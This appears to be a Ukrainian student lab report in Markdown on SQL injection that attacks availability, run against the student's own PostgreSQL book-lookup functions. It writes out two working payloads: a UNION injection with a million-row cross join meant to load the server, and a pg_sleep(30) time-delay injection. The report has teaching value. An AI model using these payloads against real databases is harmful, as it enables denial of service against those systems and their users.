## 2.2.5 Створити виклики функції з SQL-ін'єкціями з порушень доступності, приклади яких представлені в теоретичних відомостях. Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі access_results.md у GitHub-репозиторії.

#### Приклад SQL-ін'єкції порушення доступності: 
− включення додаткового запиту з декартовим перемноженням підвищення навантаження на сервер; <br>


ALTER TABLE books ALTER COLUMN publisher TYPE varchar;  <br>
select * from get_books_by_name2 ('1'' UNION  <br>
(select a1, cast (a1 as varchar), cast (a1 as varchar)  <br>
from  <br>
(Select generate_series a1 from generate_series (1,1000)) t1  <br>
CROSS JOIN  <br>
(Select * from generate_series (1,1000) t2) t3) -- ');  <br>


![8_12](https://user-images.githubusercontent.com/120367818/213998116-68fd470d-8399-4ae7-88f9-7482eed35435.png)


#### Приклад SQL-ін'єкції порушення доступності: 
− включення включення підзапиту зі сплячим процесом.; <br>

#### Початок запиту: 

select * from get_books_by_name1 ('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');

![8_13](https://user-images.githubusercontent.com/120367818/213998358-d790ea94-3d5d-4394-b356-95fcff98fd54.png)

#### Кінцевий результат запиту: 

![8_14](https://user-images.githubusercontent.com/120367818/213998480-df6b611e-6e9d-4ceb-affa-b47d58de0d1f.png)
